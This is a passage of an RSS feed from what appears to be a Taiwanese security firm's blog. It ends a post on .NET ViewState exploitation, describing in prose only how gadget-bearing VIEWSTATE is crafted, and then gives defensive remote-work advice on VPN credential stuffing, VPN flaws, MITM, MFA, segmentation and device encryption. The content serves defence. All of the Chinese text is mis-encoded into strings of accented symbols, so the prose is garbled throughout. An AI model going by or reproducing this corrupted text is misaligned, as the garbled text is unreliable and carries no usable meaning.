&lt;p&gt;‰∏çÈÅéÊúâÊôÇÂÄôÂç≥‰æøÂà∞‰∫ÜÊ≠§‰∏ÄÊ≠•È©üÈÇÑÊòØÊúÉÊúâ‰∏çÊòéÁöÑÈåØË™§„ÄÅ‰∏çÊòéÁöÑÂéüÂõ†Â∞éËá¥ MAC Ë®àÁÆóÂßãÁµÇÊòØÈåØË™§ÁöÑÔºåÂõ†ÁÇ∫ .NET ÂÖßÈÉ®ÊºîÁÆóÊ≥ï‰ª•ÂèäÈúÄË¶ÅÁöÑÁí∞Â¢ÉÂèÉÊï∏ÁµÑÂêàÁ®çÂæÆË§áÈõúÔºå‰ΩøÂæóÂ∑•ÂÖ∑Ê≤íËæ¶Ê≥ïËºïÊòìÊ∂µËìãÊâÄÊúâÂèØËÉΩÊÉÖÊ≥ÅÔºåËÄåÁï∂ÈÅáÂà∞ÈÄôÁ®ÆÊÉÖÂΩ¢ÊôÇÔºåÊàëÁõÆÂâçÈÅ∏ÊìáÁöÑËß£Ê±∫ÊñπÊ≥ïÈÉΩÊòØÁôºÊèÆÂ∑•‰∫∫Êô∫ÊÖßÔºåÂòóË©¶Âú®Êú¨Ê©üÂª∫Á´ãÁí∞Â¢É„ÄÅË®≠ÂÆöÁõ∏ÂêåÁöÑ MachineKey„ÄÅÊâãÂ∑•Êí∞ÂØ´ aspx Ê™îÊ°àÔºåÁî¢ÁîüÂåÖÂê´ gadget ÁöÑ VIEWSTATE ÂÜçËΩâÈÄÅÂà∞ÁõÆÊ®ô‰∏ªÊ©ü‰∏ä„ÄÇÂ¶ÇÊûú‰Ω†ÊúâÊõ¥Â§öÁôºÁèæÊàñ‰∏ç‰∏ÄÊ®£ÁöÑÊÉ≥Ê≥ïÈ°òÊÑèÂàÜ‰∫´ÁöÑË©±Ôºå‰πüÊ≠°Ëøé‰æÜÂíåÊàë‰∫§ÊµÅËÅäËÅäÂ§©„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</link>
                <guid>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell</guid>
                <pubDate>Wed, 11 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ÈÅ†Ë∑ùÂ∑•‰ΩúÁöÑË≥áÂÆâÊ≥®ÊÑè‰∫ãÈ†Ö</title>
                <description>
&lt;p&gt;ËøëÊúüÂõ†Êñ∞ÂûãÂÜ†ÁãÄÁóÖÊØíÔºàCOVID-19, Ê≠¶Êº¢ËÇ∫ÁÇéÔºâÂΩ±ÈüøÔºå‰∏çÂ∞ë‰ºÅÊ•≠ÈñãÊîæÂêå‰ªÅÈÅ†Ë∑ùÂ∑•‰Ωú (Telework)„ÄÅÂú®ÂÆ∂‰∏äÁè≠ (Work from home, WFH)„ÄÇÂú®Áñ´ÊÉÖÂä†ÈÄüÊôÇÔºåÂ¶ÇÊûúÊ≤íÊúâÊ∫ñÂÇôÂë®ÂÖ®Â∞±Ë≤øÁÑ∂ÂÖ®Èù¢ÈñãÊîæÔºåÊÅêÊÄïÊúÉÈÅ≠ÈÅáÂ∞öÊú™ËÄÉÊÖÆÂà∞ÁöÑË≥áÂÆâË≠∞È°å„ÄÇÈÄôÁØáÊñáÁ´†Êèê‰æõ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑÊåáÂºïÔºåÂà∞Â∫ïÈÅ†Á´ØÂú®ÂÆ∂‰∏äÁè≠ÊúâÂì™‰∫õÊ≥®ÊÑè‰∫ãÈ†ÖÔºüÊàëÂÄëÊúÉÂæûÂÖ¨Âè∏ÁÆ°ÁêÜ„ÄÅ‰ΩøÁî®ËÄÖÂÖ©ÂÄãÈù¢Âêë‰æÜË®éË´ñ„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûú‰Ω†Âè™ÊÉ≥ÁúãÈáçÈªûÔºåË´ãË∑≥Âà∞ÊúÄÂæå‰∏ÄÊÆµ TL;DR„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÊîªÊìäÊâãÊÆµ&quot;&gt;ÊîªÊìäÊâãÊÆµ&lt;/h2&gt;

&lt;p&gt;ÊàëÂÄëÂÖà‰æÜËÅäËÅäÊîªÊìäÁöÑÊâãÊÆµ„ÄÇË©¶ÊÉ≥‰ª•‰∏ãÂπæÂÄãÊîªÊìäÊÉÖÂ¢ÉÔºåÈÄô‰∫õÊÉÖÂ¢ÉÈÉΩÊõæË¢´ÊàëÂÄëÂà©Áî®Âú®Á¥ÖÈöäÊºîÁ∑¥ÁöÑÈÅéÁ®ã‰∏≠ÔºåÂêåÊ®£‰πüÂèØËÉΩÊòØ‰ºÅÊ•≠ÁöÑÁõ≤Èªû„ÄÇ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÊÉÖÂ¢É‰∏Ä„ÄÅ&lt;strong&gt;VPN ÊíûÂ∫´ÊîªÊìä&lt;/strong&gt;ÔºöÂêå‰ªÅ A ‰ΩøÁî® VPN ÈÄ£Á∑ö‰ºÅÊ•≠ÂÖßÈÉ®Á∂≤Ë∑ØÔºå‰ΩÜ VPN Â∏≥Ëôü‰ΩøÁî®ÁöÑÊòØËá™Â∑±ÊÖ£Áî®ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÔºå‰∏¶‰∏îÂ∞áÈÄôÁµÑÂ∏≥ËôüÂØÜÁ¢ºÈáçË§á‰ΩøÁî®Âú®Â§ñÂÖ∂‰ªñÈùûÂÖ¨Âè∏ÁöÑÊúçÂãô‰∏äÔºàÂ¶Ç Facebook„ÄÅAdobeÔºâÔºåËÄåÈÄôÁµÑÂØÜÁ¢ºÂú®ÂπæÊ¨°Â§ñÊ¥©‰∫ã‰ª∂‰∏≠Êó©Â∑≤Â§ñÊ¥©„ÄÇÊîªÊìäÂúòÈöäÈÄèÈÅéÈéñÂÆöÂêå‰ªÅ AÔºå‰ΩøÁî®ÈÄôÁµÑÂØÜÁ¢ºÁôªÂÖ•‰ºÅÊ•≠ÂÖßÈÉ®„ÄÇËÄåÂæàÈÅ∫ÊÜæÁöÑ VPN Âú®‰ºÅÊ•≠ÂÖßÈÉ®Á∂≤Ë∑Ø‰∏¶Ê≤íÊúâÂö¥Ë¨πÁöÑÈöîÈõ¢ÔºåÂõ†Ê≠§Âú®ÂÖßÈÉ®Á∂≤Ë∑ØÁöÑÁõ¥Êé•ÊâæÂà∞ÂÖßÁ∂≤Âì°Â∑• PortalÔºåÂèñÂæóÂêÑÁ®ÆÊ©üÊïèË≥áÊñô„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊÉÖÂ¢É‰∫å„ÄÅ&lt;strong&gt;VPN ÊºèÊ¥û&lt;/strong&gt;ÔºöVPN ÊºèÊ¥ûÂ∑≤Á∂ìÊàêÁÇ∫ÊîªÊìäËÄÖÁöÑ‰∏ªË¶ÅÊîªÁï•ÁõÆÊ®ôÔºåÂÖ¨Âè∏ B ‰ΩøÁî®ÁöÑ VPN ‰º∫ÊúçÂô®Âê´ÊúâÊºèÊ¥ûÔºåÊîªÊìäÂúòÈöäÈÄèÈÅéÊºèÊ¥ûÂèñÂæó VPN ‰º∫ÊúçÂô®ÁöÑÊéßÂà∂Ê¨äÂæåÔºåÂæûÁÆ°ÁêÜÂæåÂè∞ÈÖçÁΩÆÂÆ¢Êà∂Á´Ø logon scriptÔºåÂú®Âêå‰ªÅÁôªÂÖ•ÊôÇÂü∑Ë°åÊÉ°ÊÑèÁ®ãÂºèÔºåÁç≤ÂæóÂÖ∂ÈõªËÖ¶ÊéßÂà∂Ê¨äÔºå‰∏¶ÂèñÂæóÂÖ¨Âè∏Ê©üÂØÜÊñá‰ª∂„ÄÇÂèØ‰ª•ÂèÉËÄÉ‰πãÂâç Orange &amp;amp; Meh ÁöÑÁ†îÁ©∂Ôºö&lt;a href=&quot;https://www.youtube.com/watch?v=v7JUMb70ON4&quot;&gt; https://www.youtube.com/watch?v=v7JUMb70ON4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;ÊÉÖÂ¢É‰∏â„ÄÅ&lt;strong&gt;‰∏≠Èñì‰∫∫ÊîªÊìä&lt;/strong&gt;ÔºöÂêå‰ªÅ C Âú®ÂÆ∂ÈÄèÈÅé PPTP VPN Â∑•‰Ωú„ÄÇ‰∏çÂπ∏ÁöÑÊòØ C Â∞èÂ≠©ÁöÑÈõªËÖ¶‰∏≠ÂÆâË£ù‰∫ÜÂê´ÊúâÊÉ°ÊÑèÁ®ãÂºèÁöÑÁõúÁâàËªüÈ´î„ÄÇÊîªÊìäËÄÖÈÄèË©≤ÈõªËÖ¶ËÖ¶ÈÄ≤Ë°åÂÖßÁ∂≤‰∏≠Èñì‰∫∫ÊîªÊìä (MITM)ÔºåÂä´ÊåÅ C ÁöÑÊµÅÈáè‰∏¶Á†¥Ëß£ÂèñÂæó VPN Â∏≥ËôüÂØÜÁ¢ºÔºåÊàêÂäüÈÄ≤ÂÖ•‰ºÅÊ•≠ÂÖßÁ∂≤„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‰ª•‰∏äÂè™ÊòØÂπæÂÄãÊØîËºÉÂ∏∏Ë¶ãÁöÑÊÉÖÂ¢ÉÔºåÊîªÊìäÂúòÈöäÁöÑÈù¢ÂêëÈùûÂ∏∏Âª£ÔºåËÄå‰ºÅÊ•≠ÁöÑÈò≤Á¶¶Âçª‰∏çÂÆπÊòìÂÅöÂà∞Êª¥Ê∞¥‰∏çÊºè„ÄÇÈÄô‰πüÊòØÁÇ∫‰ªÄÈ∫ºÊàëÂÄëË¶ÅÊí∞ÂØ´ÈÄôÁØáÊñáÁ´†ÔºåÂ∏åÊúõËÉΩÂπ´Âä©‰∏Ä‰∫õ‰ºÅÊ•≠Âú®ÈÅ†Ë∑ùÂ∑•‰ΩúÁöÑÊôÇÊúü‰πüËÉΩÈÅîÂà∞Âü∫Êú¨ÁöÑÂÆâÂÖ®„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;È¢®Èö™Êúâ‰ªÄÈ∫º&quot;&gt;È¢®Èö™Êúâ‰ªÄÈ∫º&lt;/h2&gt;

&lt;p&gt;È¢®Èö™ÊåáÁöÑÊòØÁôºÁîüÊüêÂÄã‰∫ã‰ª∂Â∞çÊñºË©≤‰∏ªÈ´îÂèØËÉΩÈÄ†ÊàêÁöÑÂç±ÂÆ≥„ÄÇÈÄèÈÅéÂâçÈù¢‰ªãÁ¥πÁöÑÊîªÊìäÊâãÊÆµË¶ÅÈÅîÊàêÂç±ÂÆ≥ÔºåÂ∞çÊîªÊìäËÄÖ‰æÜË™™‰∏¶‰∏çÂõ∞Èõ£ÔºåÊé•ËëóÊàëÂÄëÁõ§ÈªûÂá∫‰∏Ä‰∫õÂú®‰ºÅÊ•≠ÁöÑË≥áÂÆâË¶èÁØÑ‰∏ãÔºåÂõ†ÊáâÈÅ†Ë∑ùÂ∑•‰ΩúÂèØËÉΩÂ§ßÂπÖÂ¢ûÂä†ÊîªÊìäËÄÖÈÅîÊàêÊ©üÁéáÁöÑÂõ†Â≠êÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Áí∞Â¢ÉË§áÈõúÔºöÂÖ¨Âè∏ÁÑ°Ê≥ïÁÆ°ÊéßÂÆ∂‰∏≠„ÄÅÈÅ†Ë∑ùÁöÑÂ∑•‰ΩúÁí∞Â¢ÉÔºåÈÄô‰∫õÁí∞Â¢É‰πüÊØîËºÉË§áÈõúÂç±Èö™„ÄÇ‰∏Ä‰∫õÂÖ¨Âè∏ÂÖßÈÉ®ÁöÑÁÆ°ÁêÜÁõ£ÊéßÊ©üÂà∂ÈÉΩÈõ£‰ª•ÊñΩÂ±ïÔºå‰πüËºÉÈõ£Ë¶ÅÊ±ÇÂêå‰ªÅÂú®ÂÆ∂‰∏≠ÁßÅ‰∫∫Ë®≠ÂÇôÂÆâË£ùÁõ£ÊéßÊ©üÂà∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ¨Âè∏Ë≥áÊñôÂ§ñÊ¥©Êàñ‰∏çÁï∂‰ΩøÁî®ÔºöËã•ÂÖ¨Âè∏ÁöÑË≥áÊñôÈÅ≠Âà∞Â§ñÊ¥©Êàñ‰∏çÁï∂‰ΩøÁî®ÔºåÂ∞áÊúÉÊúâÂö¥ÈáçÁöÑÊêçÂ§±„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë®≠ÂÇôÈÅ∫Â§±„ÄÅÈÅ≠Á´äÔºö‰∏çÁÆ°ÊòØÁ≠ÜÈõªÊàñËÄÖÊòØÊâãÊ©üÁ≠âË£ùÁΩÆÔºåÈÅ∫Â§±ÊàñËÄÖÈÅ≠Á´äÊôÇÔºåÈÉΩÊúÉÊúâË≥áÊñôÂ§ñÊ¥©ÁöÑÈ¢®Èö™„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊéàÊ¨äÊàñÂ≠òÂèñÊéßÂà∂‰∏çÊòìÂØ¶‰ΩúÔºöÂú®Áü≠ÊôÇÈñìÂÖßÊèê‰æõÂ§ßÈáèÂì°Â∑•ÁöÑÂ§ñÈÉ®Â≠òÂèñÔºåÂã¢ÂøÖÊúÉÂú®„ÄåÂèØÁî®ÊÄß„ÄçÂíå„ÄåÂÆâÂÖ®ÊÄß„ÄçÈñìÂÅöÂá∫ÂèñÊç®„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÂÖ¨Âè∏ÂÖÅË®±Âêå‰ªÅ‰ΩøÁî®ÁßÅ‰∫∫ÁöÑË®≠ÂÇôÈÄ£‰∏äÂÖ¨Âè∏ÂÖßÈÉ® VPNÔºåÈÄôÊ®£ÁöÑË≠∞È°åÂ∞±Á≠âÂêå BYOD (Bring Your Own Device)ÔºåÈÄô‰∫õÂÆâÂÖ®ÊÄßÁöÑÈ°ßÊÖÆÊúâ‰∏çÂ∞ëÊñáÁ´†ÂèØ‰ª•ÂèÉËÄÉ„ÄÇ‰æãÂ¶Ç NIST SP800-46 Guide to Enterprise Telework, Remote Access, and Bring Your Own Device (BYOD) Security&lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&quot;&gt; https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂÖ¨Âè∏Èù¢Âêë&quot;&gt;ÂÖ¨Âè∏Èù¢Âêë&lt;/h2&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÊàëÂÄë‰æÜÁúãÁúãÂÖ¨Âè∏ÊñπÈù¢Âú®ÈÅ†Ë∑ùÂ∑•‰Ωú‰∏äÈù¢ÊúâÂì™‰∫õË≥áÂÆâ‰∏äÈù¢ÁöÑ‰ΩúÁÇ∫„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊµÅÁ®ãÂèäÂéüÂâáË¶èÂäÉ&quot;&gt;Â∑•‰ΩúÊµÅÁ®ãÂèäÂéüÂâáË¶èÂäÉ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Â∑•‰ΩúÊµÅÁ®ãË™øÊï¥&lt;/strong&gt;ÔºöÈÅ†Ë∑ùÂ∑•‰ΩúÊôÇÔºåÊØèÂÄãÊµÅÁ®ãË©≤Â¶Ç‰Ωï‰ΩúÂ∞çÊáâÁöÑË™øÊï¥Ôºå‰æãÂ¶ÇÂ¶Ç‰ΩïÂú®‰∏çÂêåÂú∞ÈªûÂçîÂêå‰ΩúÊ•≠„ÄÅÂΩôÊï¥Â∑•‰ΩúË≥áÊñô„ÄÅÁ¢∫Ë™çÂ∑•‰ΩúÊàêÊûúÂèäÂìÅË≥™Á≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ë≥áÊñôÁõ§Èªû&lt;/strong&gt;ÔºöÂì™‰∫õË≥áÊñôÊîæÂú®Èõ≤Á´Ø„ÄÅ‰º∫ÊúçÂô®„ÄÅÂÄã‰∫∫ÈõªËÖ¶ÔºåÁï∂ÈÅ†Ë∑ùÂ∑•‰ΩúÊôÇÂì™‰∫õË≥áÊñôÂ∞áÁÑ°Ê≥ïË¢´ÂèñÁî®ÔºåÊàñË©≤Â∞áË≥áÊñôËΩâÁßªÂà∞Âì™ÈÇä„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÊúÉË≠∞ÊµÅÁ®ã&lt;/strong&gt;ÔºöÊúÉË≠∞ÊôÇË¶ñË®äË®≠ÂÇô„ÄÅËªüÈ´îÈÅ∏ÊìáÂèäÊ∏¨Ë©¶Ôºå‰∏¶Ê≥®ÊÑèÊúÉË≠∞ËªüÈ´îÈÄöË®äÊòØÂê¶ÊúâÂä†ÂØÜ„ÄÇÁãÄÊ≥ÅÂ¶ÇÊúÉË≠∞ÊôÇÈñìÂª∂Èï∑„ÄÅÂêåÊôÇÁôºË®Ä„ÄÅÈÅ†Ë∑ùÂìÅË≥™ÂΩ±ÈüøÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;‰∫ã‰ª∂ËôïÁêÜÂúòÈöäÂèäÊµÅÁ®ã&lt;/strong&gt;ÔºöÂõ†ÈÅ†Ë∑ùÂ∑•‰ΩúÊôÇÁôºÁîüÁöÑË≥áÂÆâ‰∫ã‰ª∂ÔºåË©≤Áî±Ë™∞Ë≤†Ë≤¨ËôïÁêÜ„ÄÅÂ¶Ç‰ΩïËôïÁêÜ„ÄÅÁõ§ÈªûÊêçÂ§±„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÂÉÖÁü•„ÄÅÊúÄÂ∞èÊ¨äÈôêÂéüÂâá&lt;/strong&gt;ÔºöÂÉÖÁü•ÂéüÂâá (Need-to-know Basis) ‰ª•ÂèäÊúÄÂ∞èÊ¨äÈôêÂéüÂâá (Principle of Least Privilege, PoLP)ÔºåÂÉÖÁµ¶‰∫àÊØèÂÄãÂêå‰ªÅÊúÄÂ∞èÈôêÂ∫¶ÈúÄË¶ÅÁöÑË≥áÊñô‰ª•ÂèäÊ¨äÈôêÔºåÈÅøÂÖçÈ°çÂ§ñÁöÑÂÆâÂÖ®ÂïèÈ°å„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Á∂≤Ë∑ØÁÆ°ÁêÜ&quot;&gt;Á∂≤Ë∑ØÁÆ°ÁêÜ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;VPN Â∏≥ËôüÁî≥Ë´ãÂèäÁõ§Èªû&lt;/strong&gt;ÔºöÂì™‰∫õÂêå‰ªÅÈúÄË¶Å‰ΩøÁî® VPNÔºåÂ±¨ÊñºÂì™‰∫õÁæ§ÁµÑÔºåÊØèÂÄãÁæ§ÁµÑÁöÑÊ¨äÈôêÂèäÈÄ£Á∑öÁØÑÂúçÁöÜ‰∏çÂêå„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VPN Â∏≥ËôüÊ¨äÈôêÁØÑÂúçÂèäÂÖßÁ∂≤ÂàÜÂçÄ&lt;/strong&gt;ÔºöVPN ÈÄ£Á∑öÈÄ≤‰æÜÂæåÔºå‰∏çÊáâÂ≠òÂèñÊï¥ÂÄãÂÖ¨Âè∏ÂÖßÁ∂≤ÊâÄÊúâ‰∏ªÊ©üÔºåÂõ†ÁÇ∫ VPN Ë¶ñÂêåÂ§ñÈÉ®ÈÄ£Á∑öÔºåÈ¢®Èö™Á≠âÁ¥öÊáâË©≤Êõ¥È´òÔºåÊõ¥ÊáâË©≤ÂÅöÈÄ£Á∑öÁöÑÂàÜÂçÄÁÆ°Êéß„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Áõ£ÊéßÁ¢∫Ë™ç VPN ÊµÅÈáèÂèäË°åÁÇ∫&lt;/strong&gt;ÔºöÈÄèÈÅéÂÖßÈÉ®Á∂≤Ë∑ØÁöÑÁ∂≤Ë∑ØÊµÅÈáèÁõ£ÊéßÊ©üÂà∂ÔºåÁ¢∫Ë™ç VPN ‰ΩøÁî®ÊúâÁÑ°Áï∞Â∏∏Ë°åÁÇ∫„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Âè™ÂÖÅË®±ÁôΩÂêçÂñÆË®≠ÂÇôÂèñÂæó IP ‰ΩçÂùÄ&lt;/strong&gt;ÔºöÂ∑≤Áî≥Ë´ãÁöÑË®≠ÂÇôÊâçËÉΩÂèñÂæóÂÖßÁ∂≤ IP ‰ΩçÂùÄÔºåÈÅøÂÖçÂèØÁñëË®≠ÂÇôÂá∫ÁèæÂú®ÂÖßÈÉ®Á∂≤Ë∑Ø„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÈñãÂïüÂ∏≥ËôüÂ§öÂõ†Â≠êË™çË≠â&lt;/strong&gt;ÔºöÂ∞áÈõ≤Á´ØÊúçÂãô„ÄÅVPN„ÄÅÂÖßÈÉ®Á∂≤Ë∑ØÊúçÂãôÈñãÂïüÂ§öÂõ†Â≠êË™çË≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Á¢∫Ë™ç VPN ‰º∫ÊúçÂô®ÊòØÂê¶ÁÇ∫Êñ∞Áâà&lt;/strong&gt;ÔºöÂú®ÊàëÂÄëÈÅéÂéªÁöÑÁ†îÁ©∂ÁôºÁèæ VPN ‰º∫ÊúçÂô®‰πüÊúÉÊòØÊîªÊìäÁöÑÂ∞çË±°ÔºåÂõ†Ê≠§ÂØÜÂàáÊ≥®ÊÑèÊòØÂê¶ÊúâÊõ¥Êñ∞ÊàñËÄÖ‰øÆË£úÁ®ãÂºè„ÄÇ&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Palo Alto GlobalProtect Ë≥áÂÆâÈÄöÂ†± &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;FortiGate SSL VPN Ë≥áÂÆâÈÄöÂ†± &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Pulse Secure SSL VPN Ë≥áÂÆâÈÄöÂ†± &lt;a href=&quot;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÂÄºÂæóÁâπÂà•ÈªûÂá∫ÁöÑÊòØ VPN ÁöÑË®≠ÂÆöËàáÈñãÊîæ„ÄÇËøëÊúüËÅΩËÅûÂà∞‰∏çÂ∞ëÂÖ¨Âè∏ÁöÑÁÆ°ÁêÜÈöéÂ±§Ë´áË´ñÂà∞ÔºåÂõ†ÊáâÁñ´ÊÉÖÂéüÊú¨‰∏çÈñãÊîæ VPN Ê¨äÈôêÁöÑÂêå‰ªÅÁèæÂú®ÂÖ®ÈñãÊîæ‰∫Ü„ÄÇËÄåÂïèÂà∞ VPN ÈÄ£Á∑öÈÄ≤ÂÖ¨Âè∏ÂÖßÈÉ®Á∂≤Ë∑Ø‰πãÂæåÁöÑÁõ£ÊéßË∑üÈòªÈöîÁÇ∫‰ΩïÔºåÂçªËºÉÂ∞ëÊúâ‰ºÅÊ•≠ÂÖ∑ÂÇôÈÄôÊ®£ÁöÑË¶èÂäÉ„ÄÇÂÖßÈÉ®Á∂≤Ë∑ØÊòØ‰ºÅÊ•≠ÁöÑ‰∏ÄÂ§ßË≥áÂÆâÊà∞Â†¥ÔºåÈñãÊîæ VPN ÁöÑÂêåÊôÇÔºåÂøÖÂÆöË¶ÅÊÄùËÄÉË≥áÂÆâÂ∞çÊáâÁöÑÊé™ÊñΩ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;‰ΩøÁî®ËÄÖÈù¢Âêë&quot;&gt;‰ΩøÁî®ËÄÖÈù¢Âêë&lt;/h2&gt;

&lt;p&gt;ÂÖ¨Âè∏Ê∫ñÂÇôÂ•Ω‰∫ÜÔºåÊé•‰∏ã‰æÜÂ∞±ÊòØ‰ΩøÁî®ËÄÖÁöÑÂÆâÂÖ®ÊÄß‰∫Ü„ÄÇÈô§‰∫ÜÂÖ¨Âè∏Êèê‰æõÁöÑ VPN Á∑öË∑Ø„ÄÅÊû∂Êßã„ÄÅÊ©üÂà∂‰πãÂ§ñÔºå‰ΩøÁî®ËÄÖÊú¨Ë∫´ÁöÑË≥áÂÆâÊÑèË≠ò„ÄÅË¶èÁØÑ„ÄÅÂÆâÂÖ®ÊÄßË®≠ÂÆö‰πü‰∏ÄÊ®£ÈáçË¶Å„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;‰øùÂØÜ&quot;&gt;‰øùÂØÜ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Â∞àÊ©üÂ∞àÁî®&lt;/strong&gt;ÔºöÁî®‰æÜÂ≠òÂèñÂÖ¨Âè∏Á∂≤Ë∑ØÊàñË≥áÊñôÁöÑÈõªËÖ¶ÔºåÊáâÂö¥Ê†ºÈÅµÂÆàÊ≠§ÂéüÂâáÔºåÁ¶ÅÊ≠¢Â∞áË©≤Ë®≠ÂÇô‰ΩúÁÇ∫ÈùûÂÖ¨ÂãôÁî®ÈÄî„ÄÇ‰πüÊáâÈÅøÂÖçÈùûÂÖ¨Âè∏‰∫∫Â£´‰ΩøÁî®ÊàñÊìç‰ΩúË©≤Ë£ùÁΩÆ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ë®≠ÂÇôÁõ∏Èóú&quot;&gt;Ë®≠ÂÇôÁõ∏Èóú&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ÈñãÂïüË£ùÁΩÆÂçîÂ∞ã„ÄÅÈéñÂÆö„ÄÅÊ∏ÖÈô§ÂäüËÉΩ&lt;/strong&gt;ÔºöË®≠ÂÇôËã•ÂèØÊîúÂ∏∂ÁßªÂãïÔºåË®≠ÂÇôÁöÑÈÅ∫Â§±Â∞çÊáâÊñπÊ°àÂ∞±ÂøÖÈ†àË¶ÅËÄÉÊÖÆÂÆåÊï¥„ÄÇ‰æãÂ¶ÇÂ¶Ç‰ΩïÂ∞ãÊâæË£ùÁΩÆ„ÄÅÂ¶Ç‰ΩïÈéñÂÆöË£ùÁΩÆ„ÄÅÂ¶Ç‰ΩïÈÅ†Á´ØÊ∏ÖÈô§Â∑≤ÈÅ∫Â§±ÁöÑË£ùÁΩÆÈÅøÂÖçË≥áÊñôÂ§ñÊ¥©„ÄÇÁèæÂú®‰∏ªÊµÅ‰ΩúÊ•≠Á≥ªÁµ±Â§öÂçäÈÉΩÊúÉÊèê‰æõÈÄô‰∫õÊ©üÂà∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ë®≠ÂÇôÁôªÂÖ•ÂØÜÁ¢º&lt;/strong&gt;ÔºöË£ùÁΩÆÁôªÂÖ•ÊôÇÂøÖÈ†àË®≠ÂÆöÂØÜÁ¢ºÔºåÈÅøÂÖçÂ§ñ‰∫∫Áõ¥Êé•Êìç‰Ωú„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ë®≠ÂÇôÂÖ®Ê©üÂä†ÂØÜ&lt;/strong&gt;ÔºöË®≠ÂÇôËã•ÈÅ∫Â§±ÈÅ≠Âà∞ÂàÜÊûêÔºåÂÖ®Ê©üÂä†ÂØÜÂèØ‰ª•Èôç‰ΩéË≥áÊñôË¢´Á†¥Ëß£ÈÅ∫Â§±ÁöÑÈ¢®Èö™„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÔºàÈÅ∏ÊìáÊÄßÔºâ&lt;strong&gt;MDM (Mobile Device Management)&lt;/strong&gt;ÔºöËã•ÂÖ¨Âè∏ÊúâÂ∞éÂÖ• MDMÔºåÂèØ‰ª•ÂçîÂä©‰ª•‰∏äÁöÑÁÆ°ÁêÜ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∏≥ËôüÂØÜÁ¢ºÂÆâÂÖ®&quot;&gt;Â∏≥ËôüÂØÜÁ¢ºÂÆâÂÖ®&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;‰ΩøÁî®ÂØÜÁ¢ºÁÆ°ÁêÜÂ∑•ÂÖ∑‰∏¶Ë®≠ÂÆö„ÄåÂº∑ÂØÜÁ¢º„Äç&lt;/strong&gt;ÔºöÂèØ‰ª•ËÄÉÊÖÆ‰ΩøÁî®ÂØÜÁ¢ºÁÆ°ÁêÜÂ∑•ÂÖ∑‰∏¶Â∞áÂØÜÁ¢ºË®≠ÁÇ∫ÂÖ®Èö®Ê©üÁî¢ÁîüÂåÖÂê´Ëã±Êñá„ÄÅÊï∏Â≠ó„ÄÅÁ¨¶ËôüÁöÑÂØÜÁ¢º‰∏≤„ÄÇ&lt;/li&gt;
